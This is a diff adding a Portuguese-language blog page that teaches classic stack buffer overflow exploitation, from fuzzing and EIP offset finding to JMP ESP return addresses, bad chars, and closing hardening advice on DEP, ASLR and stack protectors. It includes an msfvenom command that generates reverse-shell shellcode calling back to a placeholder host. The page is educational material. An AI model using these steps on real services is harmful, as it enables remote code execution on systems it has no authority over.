@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+	<meta charset="utf-8">
+	<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&display=swap" rel="stylesheet">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>xispe</title>
+	<link rel="icon" type="image/x-icon" href="Imagens/Icone.png">
+	<style>
+		body { 
+			background-color:#090B0B;
+			height: auto;
+		}
+
+		h1 { 
+			color: #E5EBEA;
+			font-family: ubuntu;
+			font-size: 48px;
+		}
+		
+		h2 { 
+			color: #E5EBEA;
+			font-family: ubuntu;
+			font-size: 32px; }
+
+		h3 { 
+			color: #E5EBEA;
+			font-family: ubuntu;
+			font-size: 28px; }
+		
+		p { 
+			color: #E5EBEA;
+			font-family: ubuntu;
+			font-size: 24px;
+		}
+
+		li {
+			color: #E5EBEA;
+			font-family: ubuntu;
+			font-size: 24px;
+		}
+
+		a {
+			color: #8A8DA2;
+			font-family: ubuntu;
+			font-size: 24px;
+			display: inline-block;
+			padding: inherit;
+			word-wrap: break-word;
+		}
+
+		u {
+			color: #8A8DA2;
+			font-family: ubuntu;
+		}
+
+		img {
+			width: 80%;
+			align-self: center;
+		}
+
+		footer {
+			display: flex;
+			flex-direction: column;
+			text-align: center;
+			padding: 20px;
+		}
+
+		img {
+			width: 50%;
+		}
+
+		.cabecalho{
+			width: 60;
+			max-width: 500px;
+			min-width: 300px;
+			padding: 20px;
+		}
+
+		.layout {
+			display: flex;
+			flex-direction: column;
+			padding-inline: 10%;
+		}
+
+	</style>
+</head>
+<body>
+	<div align="center"><a href="https://xispe.github.io"><img class="cabecalho" src="Imagens/cabeçalho.png" title="Pagina Inicial"></a></div>
+
+	<div class="layout">
+		<h1>Buffer Overflow</h1>
+		<p class="date"> 22/11/2024</p>
+
+		<h1 id="introdução">Introdução</h1>
+		<p>Esse artigo não endossa qualquer tipo de ação contra as leis, essa informação está aqui apenas para compartilhar conhecimento ( ͡° ͜ʖ ͡°). Esta falha é muito perigosa, já que pode desde derrubar o serviço à conseguir uma shell na máquina alvo, e necessita de uma base de conhecimento sólida devido ela atuar em um nível de <strong>código de maquina</strong>. Para entender essa falha é recomendado no mínimo entender <a href="Assembly Básico.html">Assembly Básico</a>, e conhecer e saber usar debuggers.</p>
+		<h1 id="o-que-é-buffer-overflow">O que é Buffer Overflow</h1>
+		<p>Primeiramente, para entender essa falha é necessário ter um entendimento do funcionamento básico da Stack. Segue uma representação do funcionamento normal de um programa que aceita entrada de dados e os armazena:</p>
+		<img src="Imagem/Stack.png">
+		<p>E em casos onde existe uma entrada de dados vulneráveis ou sem o devido tratamento da informação, é possível enviar um número maior que o Buffer suporta, sobrescrevendo as demais informações.</p>
+		<img src="Imagem/Buffer Overflow.png">
+		<p>Dessa forma criando a oportunidade de influenciar na ordem da execução do software.</p>
+		<h1 id="passos-para-fazer-um-buffer-overflow">Passos para fazer um Buffer Overflow</h1>
+		<p>Antes de tudo, é recomendado que você crie um ambiente de testes para fazer essa pesquisa. Primeiro enumere o serviço e o ambiente onde ele roda e tente replicar de forma fiel para que você tenha maiores chances de achar a vulnerabilidade que te interessa.</p>
+		<h2 id="1-descobrir-se-o-programa-é-vulnerável">1. Descobrir se o programa é vulnerável</h2>
+		<p>Para descobrir uma vulnerabilidade no programa é primeiro fundamental encontrar uma entrada de informações, pode ser de qualquer espécie, caso essa entrada use métodos vulneráveis (como strcpy, gets, scanf).</p>
+		<p>Para testar sem que tenha acesso ao código fonte, pode-se primeiro tentar inserir de forma progressiva uma quantidade de dados, caso o programa pare de funcionar após certa quantidade e no debugger aparece o endereço EIP sobrescrito é porque ele é vulnerável.</p>
+		<p>Esse processo de mandar várias entradas até chegar a uma que quebre o serviço é chamado de fuzzing. Segue um script que automatiza esse processo:</p>
+<pre><code class="language-python"># Modo de uso: fuzzing.py (número multiplo de 10 limite)
+import sys
+
+lista = []
+i = 0
+limite = sys.argv[1]
+
+while len(lista) &lt; int(limite):
+    i += 1
+    lista.append(&quot;A&quot; * (i * 10))
+
+for buffer in lista:
+    print(f&quot;buffer de {len(buffer)} bytes: {buffer}&quot;)
+</code></pre>
+		<h2 id="2-encontrar-a-quantidade-bytes-para-controlar-o-eip">2. Encontrar a quantidade bytes para controlar o EIP</h2>
+		<p>Uma vez que já encontrou uma vulnerabilidade, podemos descobrir qual é o número exato de bytes para chegar no EIP e controlar o andamento do programa. </p>
+		<p>Para isso, é fundamental ter o seu debugger de preferência em mãos e já com o seu software ligado. E ainda, para esse processo é possível faze-lo de 2 formas: manual e automatizado.</p>
+		<h3 id="manual">Manual</h3>
+		<p>Para chegarmos ao valor certo para controlar o EIP faremos um tipo de &quot;busca binária&quot;. Uma vez que achamos um valor que quebra o buffer, iremos dividir esse buffer pela metade e associar a outro valor, logo após verificaremos no debugger qual valor sobrescreveu o EIP e faremos esse processo até chegar no valor certo. Segue um exemplo didático:</p>
+<pre><code>Buffer que quebrou a aplicação (20 digitos):AAAAAAAAAAAAAAAAAAAA
+EIP: 41414141 (AAAA)
+
+Buffer 1: AAAAAAAAAABBBBBBBBBB (10 A e 10 B)
+EIP: 42424242 (BBBB)
+
+Buffer 2: AAAAAAAAAAAAAAABBBBB (15 A e 5 B)
+EIP: 41424242 (BBBA)
+
+Logo EIP está a 14 bytes
+</code></pre>
+		<h3 id="automatizado">Automatizado</h3>
+		<p>Usando as ferramentas pattern_create e pattern_offset do framework Metasploit, podemos chegar ao valor rapidamente. Segue exemplos de uso:</p>
+<pre><code>msf-pattern_create -l (tamanho)
+msf-pattern_offset -l (tamanho) -q (valor encontrado no EIP)
+</code></pre>
+		<p>Dessa forma essas ferramentas já te entregará o valor certo para fazer o controle do EIP.</p>
+		<h2 id="3-encontrar-um-bom-endereço-de-retorno">3. Encontrar um bom endereço de retorno</h2>
+		<p>Até aqui já existe uma vulnerabilidade no serviço, porém sem um bom endereço que retorne para a Stack essa vulnerabilidade será apenas de DOS e não permitirá um Remote Code Execution (que é o ideal para o pesquisador).</p>
+		<p>Para que achar um bom endereço de retorno à Stack é necessário um que não mude de endereço ao reiniciar o programa e que tenha a instrução <code>JMP ESP</code>, para isso é valido olhar os arquivos <code>dll</code> ligados ao software dando preferência aos que não sejam nativos do sistemas. Caso não haja um endereço de retorno que seja satisfatório você pode considerar formas de fazer o bypass dos mecanismos de proteção em questão, porém essas técnicas são complexas.</p>
+		<p>E ainda que você ache, é fundamental lembrar-se de passar o código correspondente ao endereço da memória de forma contrária para que na Stack ele esteja correto.</p>
+		<h2 id="4-testar-bad-chars">4. Testar Bad Chars</h2>
+		<p>Caso você tenha um bom endereço de redirecionamento em mãos, entra o momento de pensar seu <strong>shellcode</strong>, que é o código que te garantirá a execução remota. E para ter certeza que ele vá funcionar é necessário saber quais são os caracteres que a aplicação não aceita.</p>
+		<p>Existem algumas listas pré-prontas na internet de fácil acesso, e esse processo é feito enviando essa lista após o seu buffer já feito e verificar se a ordem dos algarismos está correta na Stack, caso a ordem seja quebrada remova o caractere que não apareceu e repita o processo até conseguir manter a ordem. E tenha esses bad chars anotados pois eles são necessários no próximo passo</p>
+		<h2 id="5-gerar-um-shellcode">5. Gerar um shellcode</h2>
+		<p>Antes de gerar o shellcode vale a pena testar se a Stack é capaz de armazenar o tamanho do shellcode, que para sistemas Windows costuma ser por volta de 350 bytes, e ainda fazer uma série de instruções <code>NOP</code> pois mesmo o endereço <code>ESP</code> não é preciso e não queremos que pule para o meio do nosso código (técnica chamada NOP Slide).</p>
+		<p>Existem algumas formas de gerar um shellcode, nesse artigo cobrirei pelo msfvenom.  Esse comando possui a seguinte sintaxe:</p>
+<pre><code>msfvenom -p payload -b &quot;BadChars&quot; LHOST=seuip LPORT=443 -f py
+Payload Windows: windows/shell_reverse_tcp
+Payload Linux: linux/x86/shell_bind_tcp
+</code></pre>
+		<p>Caso queira evitar que o programa quebre após fechar a shell você pode incluir o argumento <code>EXITFUNC threads</code>, essa parte ainda tem muitos fatores que podem melhorar seu código então vale o estudo. </p>
+		<p>E após identificar uma entrada de dados, achar o offset do endereço EIP, achar um endereço de retorno desprotegido, criar seu shellcode e envia-lo para a Stack seu ataque de Buffer Overflow estará completo.</p>
+		<h1 id="mecanismos-de-proteção">Mecanismos de proteção</h1>
+		<p>No momento de encontrar um bom endereço de retorno existe alguns mecanismos de proteção que podem impedir a execução de um shellcode. Dentre eles os mais importantes são:</p>
+		<h2 id="data-execution-protection---dep">Data Execution Protection - DEP</h2>
+		<p> Essa proteção atua bloqueando a execução de qualquer código que esteja em regiões da memória que deveriam conter apenas dados.</p>
+		<h2 id="address-space-layout-randomization---aslr">Address Space Layout Randomization - ASLR</h2>
+		<p>Mecanismo que atua aleatorizando os endereços de memória onde diferentes componentes do programa são executados, dessa forma impossibilitando achar um bom endereço de retorno que seja estático.</p>
+		<p>E apesar de esses mecanismos serem eficientes é completamente possível fazer um bypass deles. Porém para isso é necessário utilizar técnicas mais complexas como ROP Chains.</p>
+		<h1 id="como-proteger-se">Como proteger-se</h1>
+		<h2 id="windows">Windows</h2>
+		<p>Ambas funções supracitadas vem por padrão ativadas nos sistemas Windows, porém há formas de também forçar elas mesmo em aplicativos sem essas funções por padrão, porém isso pode causar problemas de compatibilidade. Para fazer isso no Windows pode ir  em <strong>Exibir configurações avançadas do sistema -&gt; Avançado -&gt; Desempenho/Configurações -&gt; Prevenção de Execução de Dados -&gt; Ativar a DEP para todos os programas e serviços, exceto os que eu selecionar</strong>, e para o ASLR <strong>Windows Defender -&gt; Controle de aplicativos e do navegador -&gt; Configurações do Exploit Protection</strong> e lá colocar a opção do ASLR com ligado por padrão, e mudar o DEP aqui também funciona.</p>
+		<h2 id="linux">Linux</h2>
+		<p>No Linux existe algumas formas de se proteger contra esses ataques. Como exemplo você pode compilar diretamente na sua maquina os softwares e colocar argumentos como <code>-fstack-protector</code> ou <code>-fstack-protector-all</code> no gcc entre outras opções, isolar seu programas com containerização como Docker para isolaro software de qualquer superfície de ataque, manter somente os serviços que você usa ativos para diminuir os possíveis pontos de entrada e manter seu sistema o mais atualizado o possível.</p>
+		<p>Porém nada disso é garantia de segurança, é sempre fundamental usar o computador com consciência desses perigos.</p>
+		<h1 id="dica-extra">Dica extra</h1>
+		<p>Em CTFs nem sempre é necessário fazer todo o processo, parte das vezes é possivel mudar o endereço EIP diretamente pelo debugger.</p>
+
+	</div>
+
+	<footer>
+		<u>22/11/2024</u>
+		<u>xispe01@proton.me</u>
+	</footer>
+
+</body>
+</html>
